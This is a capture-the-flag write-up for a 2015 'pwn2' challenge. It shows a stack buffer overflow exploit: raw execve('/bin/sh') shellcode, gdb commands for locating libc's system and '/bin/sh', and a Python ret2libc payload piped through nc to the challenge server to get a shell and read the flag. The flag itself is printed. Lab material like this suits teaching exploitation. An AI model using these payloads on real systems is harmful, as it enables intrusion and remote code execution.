## pwn2 - 120 (Pwning) ##
#### Writeup by r3ndom_ #####
Created: 2015-12-08

### Problem ###
This one is a bit more complicated...nc pwn.problem.sctf.io 1338

Flag is in flag.txt

### Hint ###
It runs on the same box as pwn1.

## Answer ##

### Overview ###
The binary for pwn2 contains no imports for system and as such we can't spawn a shell with that. This means we have to turn to pwn1 to get the addresses of system and "/bin/sh" in libc. 

### Details ###
The buffer is yet again at an offset of 0x2c from the location that will be returned. This means we begin with the same concept. 

```python
shell_code = 'A'*0x2c
```

Then we find how to change eip to be esp.
First find a push esp, the opcode for this instuction is 0xff 0xf4.
We can use the 0xff 0xf4 from _start that is part of the call to __libc_start_main. 

The next instructions are all xchg ax, ax. This is effectively a nop and is used by gcc for spacing. Then theres a function that returns without changing the stack. Perfect, our code will fall through from there.

```python
shell_code += '\xd0x83\x04\x08'
```

There we go, that'll call anything we put past this point.

Now we write a little bit of shellcode to call system.

```python
shell_code += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print shell_code
```

Now we just pipe that in to the pwn1 server to get a call of any system instruction that can be "/bin/sh" to spawn us a shell.

After this go to the tmp directory so you can use gdb (it only works with file write perms), and wget pwn2. Then you can execute gdb on pwn2 and do:

```
b main
r
p system
find &system,+999999,"/bin/sh"
```

This will find you the addresses you need to ROP pwn2.

Now you can build an exploit for pwn2.

```python
import struct
def gen_ptr(a):
	return struct.pack("<L", a)
rop = 'A'*0x2c

# system address
rop += gen_ptr(0xb7e67190)

# filler
rop += 'wow_'

# "/bin/sh" address
rop += gen_ptr(0xb7e5a1e0)

print rop
```

Now just

```
cat <(python rop.py) - | nc pwn.problem.sctf.io 1338
```

and you can use the shell on pwn2 to cat flag.txt.

### Flag ###

    flag{p0pp1ng_sh3ll_thr0ugh_libc}

